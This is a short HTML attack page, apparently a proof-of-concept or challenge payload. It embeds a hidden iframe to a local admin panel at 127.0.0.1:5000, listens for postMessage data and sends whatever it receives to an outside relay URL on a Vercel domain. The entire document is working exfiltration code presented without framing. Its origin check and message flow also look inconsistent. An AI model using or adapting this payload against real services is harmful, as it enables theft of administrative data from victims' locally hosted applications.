<!DOCTYPE html>
<html>
<body>
    <iframe id="adminIframe" src="http://127.0.0.1:5000/admin" style="display:none;"></iframe>
    <script>
        window.addEventListener('message', function(event) {
            if (event.origin !== 'http://localhost:5000') return; // Ensure we're getting messages from the expected origin
            var adminContent = event.data;
            fetch('https://redirect-git-main-seebuschs-projects.vercel.app/relay', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: adminContent })
            });
        });
    </script>
</body>
</html>
